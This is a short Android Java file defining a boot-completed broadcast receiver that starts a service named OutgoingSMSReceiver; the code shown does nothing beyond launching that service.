package com.example.remote;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootCompletedListener extends BroadcastReceiver {

	@Override
	public void onReceive(Context paramContext, Intent arg1) {
		// TODO Auto-generated method stub
		paramContext.startService(new Intent(paramContext, OutgoingSMSReceiver.class));
	}

}
